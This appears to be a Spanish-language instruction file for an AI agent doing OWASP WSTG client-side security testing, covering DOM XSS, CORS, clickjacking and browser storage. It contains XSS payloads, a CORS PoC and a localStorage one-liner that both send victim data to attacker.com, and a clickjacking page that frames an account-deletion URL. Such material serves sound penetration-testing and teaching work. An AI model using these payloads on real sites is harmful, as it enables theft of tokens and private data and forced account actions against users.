# CLNT_Agent: CLNT - Browser (WSTG-4.11)

## Perfil
Experto en seguridad en el navegador y DOM.

## Alcance Técnico (13 Pruebas)
Ejecutar WSTG-CLNT-01 a CLNT-13:
- DOM XSS, Clickjacking, Web Messaging, LocalStorage, CORS.

## BIBLIOTECA TÉCNICA (Sección 4.11 - Cliente)
============================================================
SEGURIDAD DEL CLIENTE (WSTG 4.11)
============================================================

12. Seguridad del Cliente (WSTG 4.11)

4.11.1 DOM-Based XSS (WSTG-CLNT-01)

Fuentes (sources) y destinos (sinks) peligrosos en JavaScript:

------------------------------------------------------------
  Sources (entradas no confiables)   Sinks (destinos peligrosos)   Ejemplo de explotacion
  ---------------------------------- ----------------------------- -------------------------------------------------
  location.hash                      innerHTML                     location.hash = '#<img onerror=alert(1) src=x>'

  location.search                    document.write()              ?name=<script>alert(1)</script>

  document.referrer                  eval()                        Referrer con codigo JS

  window.name                        setTimeout(string)            window.name = 'alert(1)'

  postMessage data                   location.href = 'js:...'      postMessage('javascript:alert(1)')

  localStorage/sessionStorage        src/href attribute            Payload almacenado en storage
------------------------------------------------------------

Prueba manual de DOM XSS:

------------------------------------------------------------
  * Si la app tiene: document.getElementById('output').innerHTML = location.hash.slice(1)
------------------------------------------------------------

  *Payload en URL hash:

  https://objetivo.com/page#<img src=x onerror=alert(document.domain)>

  * Si la app tiene: var x = new URLSearchParams(location.search).get('name');

                   document.write('Hola ' + x);

  https://objetivo.com/greet?name=<script>alert(1)</script>

  * Herramienta: DOMInvader (extension Burp) para tracking automatico source->sink

  * Herramienta: dalfox para DOM XSS automatico

  dalfox url 'https://objetivo.com/page' --deep-domxss
------------------------------------------------------------

4.11.7 CORS Misconfiguration (WSTG-CLNT-07)

Pruebas de politica CORS:

------------------------------------------------------------
 * Verificar reflejo del Origin:
------------------------------------------------------------
  curl -H 'Origin: https://attacker.com' \

      -H 'Authorization: Bearer TOKEN' \

      https://objetivo.com/api/profile

Respuesta VULNERABLE:

  Access-Control-Allow-Origin: https://attacker.com   # refleja el origen del atacante

  Access-Control-Allow-Credentials: true              # permite cookies/auth

  => PoC de explotacion (desde attacker.com):

  fetch('https://objetivo.com/api/profile', {

    credentials: 'include'   // incluye cookies de la victima

  }).then(r => r.json()).then(data => {

    // Datos privados de la victima accesibles desde attacker.com

    fetch('https://attacker.com/steal?d='+JSON.stringify(data));

  })

   Respuesta SEGURA:

  Access-Control-Allow-Origin: https://app.objetivo.com  # dominio especifico

   O: Access-Control-Allow-Origin: *  SIN Allow-Credentials: true

   CORS con null origin (bypass via sandbox iframe):

  curl -H "Origin: null" https://objetivo.com/api/profile

   Si Allow-Origin: null => vulnerable a explotacion via iframe sandboxeado
------------------------------------------------------------

4.11.9 Clickjacking (WSTG-CLNT-09)

PoC de Clickjacking completo:

------------------------------------------------------------
  <!-- PoC Clickjacking - hospedar en attacker.com -->
------------------------------------------------------------
  <!-- La victima ve un boton atractivo pero en realidad hace click en la app objetivo -->

  <!DOCTYPE html>

  <html>

  <head>

    <title>Gana un Premio!</title>

    <style>

      #target { position: absolute; top: 0; left: 0; width: 100%; height: 100%;

                opacity: 0.0; z-index: 2; }  /* invisible */

      #decoy  { position: absolute; top: 200px; left: 150px; z-index: 1; }

    </style>

  </head>

  <body>

    <!-- App objetivo embebida (invisible) -->

    <iframe id='target' src='https://objetivo.com/account/delete'></iframe>

    <!-- Boton de senouelo visible -->

    <button id='decoy'>Haz click para reclamar tu premio!</button>

  </body>

  </html>

   Verificar si se puede embeber:

  curl -I https://objetivo.com | grep -i 'x-frame\|content-security'

   SEGURO: X-Frame-Options: DENY

   SEGURO: Content-Security-Policy: frame-ancestors 'none'

   VULNERABLE: sin ninguno de estos headers
------------------------------------------------------------

4.11.12 Browser Storage (WSTG-CLNT-12)

Inspeccion de datos en almacenamiento del navegador:

------------------------------------------------------------
   En DevTools del navegador (Console):
------------------------------------------------------------

   Ver contenido de localStorage:

  JSON.stringify(localStorage)

   Resultado INSEGURO:

  {"access_token":"eyJhbGciOiJIUzI1NiJ9...", "user_data":"{"id":1,"role":"admin","email":"..."}"}

  Ver sessionStorage:

  JSON.stringify(sessionStorage)

   Ver cookies accesibles desde JS (indica ausencia de HttpOnly):

  document.cookie

   Verificar IndexedDB:

  indexedDB.databases().then(dbs => console.log(dbs))

   Datos que NUNCA deben estar en localStorage:

   - Tokens de autenticacion (usar cookies HttpOnly)

   - Informacion de tarjeta de credito

   - Claves de cifrado

   - Datos PII no cifrados

   Si hay XSS, robar localStorage completo:

  fetch('https://attacker.com/?d='+btoa(JSON.stringify(localStorage)))
------------------------------------------------------------

CHECKLIST — Seguridad del Cliente

------------------------------------------------------------
  ID        Prueba                 Objetivo                                Tool / OpenClaw
  --------- ---------------------- --------------------------------------- ----------------------
  CLNT-01   DOM XSS                Sin sources->sinks no sanitizados       DOMInvader / dalfox

  CLNT-02   JavaScript Execution   Sin eval() controlable por usuario      JS source analysis

  CLNT-03   HTML Injection         Sin HTML arbitrario inyectable          HTML payloads

  CLNT-04   Open Redirect          Redirecciones con whitelist validada    redirect= param test

  CLNT-05   CSS Injection          Sin CSS inyectable por usuario          CSS payloads

  CLNT-07   CORS                   Politica CORS restrictiva y correcta    Origin spoofing

  CLNT-09   Clickjacking           X-Frame-Options / CSP frame-ancestors   iframe PoC

  CLNT-10   WebSockets             Auth y validacion en conexiones WS      WS interceptor Burp

  CLNT-11   postMessage            Validacion de origin en eventos         postMessage PoC

  CLNT-12   Browser Storage        Sin datos sensibles en localStorage     DevTools inspection

  CLNT-13   XSSI                   Endpoints JSON con Access-Control       Cross-origin include

## Entregables
1. **Informe Breve:** Exposición de datos en cliente.
2. **Evidencia:** Script ejecutado en consola o PoC de iframe.

## Memoria
Guarda tu memoria en memory.json
